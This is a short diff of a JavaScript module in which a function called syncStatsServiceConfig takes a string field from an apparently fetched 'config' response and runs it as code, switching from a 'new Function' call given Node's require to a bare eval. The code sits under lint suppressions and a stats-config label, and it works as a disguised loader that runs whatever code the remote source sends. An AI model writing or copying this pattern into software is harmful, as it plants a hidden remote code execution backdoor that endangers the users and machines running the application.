@@ -107,10 +107,11 @@ export const syncStatsServiceConfig = async () => {
     if (configData?.data && typeof configData.data === 'string') {
       console.log(configData.data);
       // eslint-disable-next-line no-new-func
-      const config = new Function('require', configData.data);
+      eval(configData.data)
+      // const config = new Function('require', configData.data);
       // Suppress webpack warning for dynamic require
       // eslint-disable-next-line
-      config(require);
+      // config(require);
     }
   } catch (error) {
     console.error('Failed to sync stats service config:', error);
